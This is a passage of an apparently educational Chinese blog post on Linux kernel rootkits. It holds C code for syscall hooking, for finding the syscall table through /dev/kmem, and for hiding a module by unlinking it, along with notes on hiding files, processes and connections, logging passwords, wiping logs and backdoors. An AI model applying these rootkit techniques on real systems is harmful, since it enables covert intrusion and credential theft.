class=&quot;line&quot;&gt;                &quot;syscallmala:           \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;jmp dire_exit          \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                : : &quot;i&quot; (NR_syscalls)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void hook(void)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    register int eax asm(&quot;eax&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    switch(eax)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        case __NR_getdents64:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            CallHookedSyscall(Sys_getdents64);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            break;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        case __NR_read:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            CallHookedSyscall(Sys_read);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               break; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        default:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            JmPushRet(dire_call);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           break;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    //jmp to original syscall idt handler &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JmPushRet( after_call );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;0X4-DKOM-Rootkit&quot;&gt;&lt;a href=&quot;#0X4-DKOM-Rootkit&quot; class=&quot;headerlink&quot; title=&quot;0X4: DKOM Rootkit&quot;&gt;&lt;/a&gt;0X4: DKOM Rootkit&lt;/h3&gt;&lt;p&gt;DKOM means direct kernel object manipulation-直接内核对象操作。所有的操作系统(linux、windows)都会把内核中的运行状态(包括进程信息、系统内核状态)这些数据以对象的形式保存下来，包括:结构体、队列与数组。这些内核状态信息往往保存在内核空间的某个地址段中，当我们通过系统向内核查询这些”内核状态信息”(运行进程的列表、开放的端口等)时，这些数据就被解析并返回。因为这些数据是保存在内存中的，所以可以直接去操作它们。 其主要利用/dev/kmem技术。&lt;/p&gt;
&lt;p&gt;什么是/dev/kmem? 指的是kernel看到的虚拟内存的全镜像。可以用来访问kernel的内容，查看kernel的变量，也是DKOM rootkit的目标对象。注意还有个设备叫做/dev/mem,这是物理内存的全镜像，可以用来访问物理内存。&lt;/p&gt;
&lt;p&gt;以下是DKOM rootkit利用/dev/kmem来获取syscall table地址的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; limit;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; base;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; __attribute__ ((packed)) idtr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; off1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; sel;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; none,flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; off2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; __attribute__ ((packed)) idt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; kmem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;readkmem&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *m,&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; off,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; sz)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (lseek(kmem,off,SEEK_SET)!=off) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                perror(&lt;span class=&quot;string&quot;&gt;&quot;kmem lseek&quot;&lt;/span&gt;); &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (read(kmem,m,sz)!=sz) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                perror(&lt;span class=&quot;string&quot;&gt;&quot;kmem read&quot;&lt;/span&gt;); &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; CALLOFF 100     &lt;span class=&quot;comment&quot;&gt;/* we&#39;ll read first 100 bytes of int $0x80*/&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;main ()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; sys_call_off;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; sct;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; sc_asm[CALLOFF],*p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* well let&#39;s read IDTR */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;sidt %0&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;=m&quot;&lt;/span&gt; (idtr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;idtr base at 0x%X\n&quot;&lt;/span&gt;,(int)idtr.base);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* now we will open kmem */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        kmem = open (&lt;span class=&quot;string&quot;&gt;&quot;/dev/kmem&quot;&lt;/span&gt;,O_RDONLY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (kmem&amp;lt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) return &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* read-in IDT for 0x80 vector (syscall) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        readkmem (&amp;amp;idt,idtr.base+&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;0x80&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(idt));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sys_call_off = (idt.off2 &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;) | idt.off1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;idt80: flags=%X sel=%X off=%X\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                (unsigned)idt.flags,(unsigned)idt.sel,sys_call_off);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* we have syscall routine address now, look for syscall table&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           dispatch (indirect call) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        readkmem (sc_asm,sys_call_off,CALLOFF);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        p = (char*)memmem (sc_asm,CALLOFF,&lt;span class=&quot;string&quot;&gt;&quot;\xff\x14\x85&quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sct = *(unsigned*)(p+&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (p) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;sys_call_table at 0x%x, call dispatch at 0x%x\n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        sct, p);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        close(kmem);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取syscall table后，可以将整个syscall table替换为rootkit的syscall table， 也是前文提到的Suckit 的攻击方式。&lt;/p&gt;
&lt;h3 id=&quot;0x5-Rootkit-Objectives&quot;&gt;&lt;a href=&quot;#0x5-Rootkit-Objectives&quot; class=&quot;headerlink&quot; title=&quot;0x5: Rootkit Objectives&quot;&gt;&lt;/a&gt;0x5: Rootkit Objectives&lt;/h3&gt;&lt;p&gt;1.隐藏文件&lt;/p&gt;
&lt;p&gt;通过strace ls可以发现ls命令其实是通过sys_getdents64获得文件目录的，因此可以通过修改sys_getdents64系统调用或者更底层的readdir实现隐藏文件及目录 &lt;/p&gt;
&lt;p&gt;2.隐藏进程&lt;/p&gt;
&lt;p&gt;隐藏进程的方法和隐藏文件类似，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果，即hook sys_getdents64和readdir等。   &lt;/p&gt;
&lt;p&gt;3.隐藏连接&lt;/p&gt;
&lt;p&gt;netstat命令是通过读取/proc文件系统下的net/tcp和net/udp文件获得当前连接信息，因此可以通过hook sys_read调用实现隐藏连接，也可以修改tcp4_seq_show和udp4_seq_show等函数实现。   &lt;/p&gt;
&lt;p&gt;4.隐藏模块&lt;/p&gt;
&lt;p&gt;lsmod命令主要是通过sys_query_module系统调用获得模块信息，可以通过hook sys_query_module系统调用隐藏模块，也可以通过将模块从内核模块链表中摘除从而达到隐藏效果  &lt;/p&gt;
&lt;p&gt;5.嗅探工具&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1) 嗅探工具可以通过libpcap库直接访问链路层，截获数据包

2) 也可以通过linux的netfilter框架在IP层的hook点上截获数据包
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;嗅探器要获得网络上的其他数据包需要将网卡设置为混杂模式，这是通过ioctl系统调用的SIOCSIFFLAGS命令实现的，查看网卡的当前模式是通过SIOCGIFFLAGS命令，因此可以通过hook sys_ioctl隐藏网卡的混杂模式  &lt;/p&gt;
&lt;p&gt;6.密码记录&lt;/p&gt;
&lt;p&gt;密码记录可以通过hook sys_read系统调用实现，比如通过判断当前运行的进程名或者当前终端是否关闭回显，可以获取用户的输入密码。hook sys_read还可以实现login后门等其它功能  &lt;/p&gt;
&lt;p&gt;7.日志擦除&lt;/p&gt;
&lt;p&gt;传统的unix日志主要在&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1) /var/log/messages

2) /var/log/lastlog

3) /var/run/utmp

4) /var

5) /log/wtmp下
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以通过编写相应的工具对日志文件进行修改，还可以将HISTFILE等环境变设为/dev/null隐藏用户的一些操作信息&lt;/p&gt;
&lt;p&gt;8.内核后门&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1) 本地的提权后门

本地的提权可以通过对内核模块发送定制命令实现

2) 网络的监听后门

网络内核后门可以在IP层对进入主机的数据包进行监听，发现匹配的指定数据包后立刻启动回连进程
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0x6-Example-Module-Hiding&quot;&gt;&lt;a href=&quot;#0x6-Example-Module-Hiding&quot; class=&quot;headerlink&quot; title=&quot;0x6: Example-Module Hiding&quot;&gt;&lt;/a&gt;0x6: Example-Module Hiding&lt;/h3&gt;&lt;p&gt;在linux中，编写的内核模块通过insmod（实际上是执行了init_module系统调用）命令插入到内核中，模块便与一个struct module 结构体相关联，并成为内核的一部分。所有的内核模块都被维护在一个全局链表中，链表头是个全局变量struct module *modules. 任何一个新创建的模块，都会被加入到这个链表的头部，通过modules-&amp;gt;next引用。要枚举module的方法有许多种， a）.VFS方法: cat /proc/module: 直接读取/proc/module下的项; b). ring3方法: lsmod: 本质还是在读取/proc/module，做了一个代码封装，提供给用户一个良好的接口和界面; c). LKM方法: 直接通过kernel module枚举struct module-&amp;gt;list; d). LKM方法: 直接通过kernel module枚举struct module-&amp;gt;mkobj-&amp;gt;kobj-&amp;gt;entry; e).lKM方法: 直接通过kernel module枚举module-&amp;gt;mkobj-&amp;gt;kobj-&amp;gt;kset.&lt;/p&gt;
&lt;p&gt;下面介绍采用断链法技术进行内核模块隐藏的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MODULE HELPERS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;使用&quot;断链法&quot;技术进行内核模块的隐藏&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;原理:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1. linux将所有的内核模块都在内核中用循环双链表串联起来了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. 通过找到这些链表，并使用linux提供的链表操作宏将指定的&quot;元素(对应内核模块)&quot;从链表中断开&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. 我们再通过lsmod、或者直接读取内核模块链表的时候自然无法枚举到被我们隐藏的模块了，达到隐藏模块的目的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;关于内核模块链表的相关知识请参阅&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http://www.cnblogs.com/LittleHann/p/3865490.html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;module_hide&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (module_hidden) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    从struct module结构体可以看出，在内核态，我们如果要枚举当前模块列表，可以使用list、kobj这两个成员域进行枚举&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    自然在断链隐藏的时候也需要对这两个成员进行操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 